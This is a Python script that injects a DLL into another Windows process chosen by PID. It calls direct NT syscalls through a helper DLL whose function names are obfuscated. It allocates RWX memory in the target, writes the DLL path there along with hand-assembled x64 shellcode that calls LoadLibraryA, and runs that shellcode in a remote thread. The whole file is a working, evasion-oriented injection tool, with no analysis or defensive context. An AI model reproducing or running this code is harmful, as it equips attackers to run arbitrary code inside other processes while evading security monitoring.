import ctypes
from ctypes import wintypes
import struct
import sys
import os

dll_path = os.path.join(os.path.dirname(__file__), "SysCaller.dll")
syscaller = ctypes.WinDLL(dll_path)

# Type aliases for clarity
NTSTATUS = wintypes.DWORD
HANDLE = wintypes.HANDLE
PVOID = wintypes.LPVOID
SIZE_T = ctypes.c_size_t
ULONG = wintypes.DWORD
if ctypes.sizeof(ctypes.c_void_p) == 8:
    ULONG_PTR = ctypes.c_uint64
else:
    ULONG_PTR = ctypes.c_uint32

# Map SysCaller obfuscated functions
syscaller.oznbvo_655212.argtypes = [
    HANDLE,
    ctypes.POINTER(PVOID),
    ctypes.POINTER(SIZE_T),
    ULONG,
    ULONG,
    ctypes.c_void_p,  # PMEM_EXTENDED_PARAMETER (optional)
    ULONG
]
syscaller.oznbvo_655212.restype = NTSTATUS

syscaller.yexedj_555900.argtypes = [
    HANDLE,
    PVOID,
    PVOID,
    SIZE_T,
    ctypes.POINTER(SIZE_T)
]
syscaller.yexedj_555900.restype = NTSTATUS

syscaller.jljtug_682236.argtypes = [
    ctypes.POINTER(HANDLE),
    ULONG,
    ctypes.c_void_p,  # POBJECT_ATTRIBUTES (optional)
    HANDLE,
    PVOID,  # StartRoutine
    PVOID,  # Argument
    ULONG,
    SIZE_T,
    SIZE_T,
    SIZE_T,
    ctypes.c_void_p  # PPS_ATTRIBUTE_LIST (optional)
]
syscaller.jljtug_682236.restype = NTSTATUS

syscaller.ezhgwv_592746.argtypes = [HANDLE]
syscaller.ezhgwv_592746.restype = NTSTATUS

# Helper: NT_SUCCESS macro
def NT_SUCCESS(status):
    return status >= 0

def inject_dll_syscaller(process_handle, dll_path):
    try:
        # Use absolute path for DLL
        abs_dll_path = os.path.abspath(dll_path)
        dll_path_bytes = abs_dll_path.encode('ascii') + b'\x00'
        path_size = len(dll_path_bytes)
        base_address = PVOID(0)
        region_size = SIZE_T(path_size)
        # Allocate memory for DLL path in target process
        status = syscaller.oznbvo_655212(
            process_handle,
            ctypes.byref(base_address),
            ctypes.byref(region_size),
            0x3000,  # MEM_COMMIT | MEM_RESERVE
            0x40,    # PAGE_EXECUTE_READWRITE
            None,
            0
        )
        if not NT_SUCCESS(status):
            print(f"[!] Failed to allocate memory for DLL path. Status: 0x{status:08X}")
            return False
        dll_path_addr = ctypes.cast(base_address, ctypes.c_void_p).value
        print(f"[+] Allocated DLL path memory at: 0x{dll_path_addr:016X}")
        # Write DLL path to allocated memory
        bytes_written = SIZE_T(0)
        status = syscaller.yexedj_555900(
            process_handle,
            base_address,
            ctypes.c_char_p(dll_path_bytes),
            path_size,
            ctypes.byref(bytes_written)
        )
        if not NT_SUCCESS(status) or bytes_written.value != path_size:
            print(f"[!] Failed to write DLL path. Status: 0x{status:08X}, Bytes written: {bytes_written.value}")
            return False
        print(f"[+] Successfully wrote DLL path to memory")
        # Get LoadLibraryA address
        kernel32 = ctypes.WinDLL('kernel32.dll')
        kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
        kernel32.GetModuleHandleW.restype = wintypes.HMODULE
        kernel32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
        kernel32.GetProcAddress.restype = wintypes.LPVOID
        h_kernel32 = kernel32.GetModuleHandleW('kernel32.dll')
        if not h_kernel32:
            print("[!] Failed to get kernel32.dll handle")
            return False
        load_library = kernel32.GetProcAddress(h_kernel32, b'LoadLibraryA')
        if not load_library:
            print("[!] Failed to get LoadLibraryA address")
            return False
        print(f"[+] LoadLibraryA address: 0x{ctypes.cast(load_library, ctypes.c_void_p).value:016X}")
        # Build x64 shellcode (windows calling convention)
        shellcode = bytes([
            0x48, 0x83, 0xEC, 0x28,             # sub rsp, 0x28
            0x48, 0xB9                          # mov rcx,
        ])
        shellcode += dll_path_addr.to_bytes(8, byteorder='little')
        shellcode += bytes([
            0x48, 0xB8                          # mov rax,
        ])
        shellcode += ctypes.cast(load_library, ctypes.c_void_p).value.to_bytes(8, byteorder='little')
        shellcode += bytes([
            0xFF, 0xD0,                         # call rax
            0x48, 0x83, 0xC4, 0x28,             # add rsp, 0x28
            0xC3                                # ret
        ])
        shellcode_size = len(shellcode)
        shellcode_addr = PVOID(0)
        region_size = SIZE_T(shellcode_size)
        status = syscaller.oznbvo_655212(
            process_handle,
            ctypes.byref(shellcode_addr),
            ctypes.byref(region_size),
            0x3000,  # MEM_COMMIT | MEM_RESERVE
            0x40,    # PAGE_EXECUTE_READWRITE
            None,
            0
        )
        if not NT_SUCCESS(status):
            print(f"[!] Failed to allocate memory for shellcode. Status: 0x{status:08X}")
            return False
        shellcode_addr_val = ctypes.cast(shellcode_addr, ctypes.c_void_p).value
        print(f"[+] Allocated shellcode memory at: 0x{shellcode_addr_val:016X}")
        # Write shellcode to allocated memory
        bytes_written = SIZE_T(0)
        status = syscaller.yexedj_555900(
            process_handle,
            shellcode_addr,
            ctypes.cast(ctypes.create_string_buffer(shellcode), PVOID),
            shellcode_size,
            ctypes.byref(bytes_written)
        )
        if not NT_SUCCESS(status) or bytes_written.value != shellcode_size:
            print(f"[!] Failed to write shellcode. Status: 0x{status:08X}, Bytes written: {bytes_written.value}")
            return False
        print(f"[+] Successfully wrote shellcode")
        # Create remote thread
        thread_handle = HANDLE(0)
        status = syscaller.jljtug_682236(
            ctypes.byref(thread_handle),
            0x1FFFFF,  # THREAD_ALL_ACCESS
            None,
            process_handle,
            shellcode_addr,
            None,
            0,
            0,
            0,
            0,
            None
        )
        if not NT_SUCCESS(status) or not thread_handle.value:
            print(f"[!] Failed to create remote thread. Status: 0x{status:08X}, Handle: {thread_handle.value}")
            return False
        print(f"[+] Created remote thread: 0x{thread_handle.value:016X}")
        # Wait for thread and close handle
        kernel32.WaitForSingleObject(thread_handle, 5000)
        syscaller.ezhgwv_592746(thread_handle)
        print(f"[+] Successfully injected {dll_path}!")
        return True
    except Exception as e:
        print(f"[!] Exception during injection: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <pid> <dll_path>")
        sys.exit(1)
    pid = int(sys.argv[1])
    dll_path = sys.argv[2]
    PROCESS_ALL_ACCESS = 0x1F0FFF
    kernel32 = ctypes.WinDLL('kernel32.dll')
    process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not process_handle:
        print(f"[!] Failed to open process {pid}")
        sys.exit(1)
    inject_dll_syscaller(process_handle, dll_path)
    kernel32.CloseHandle(process_handle)
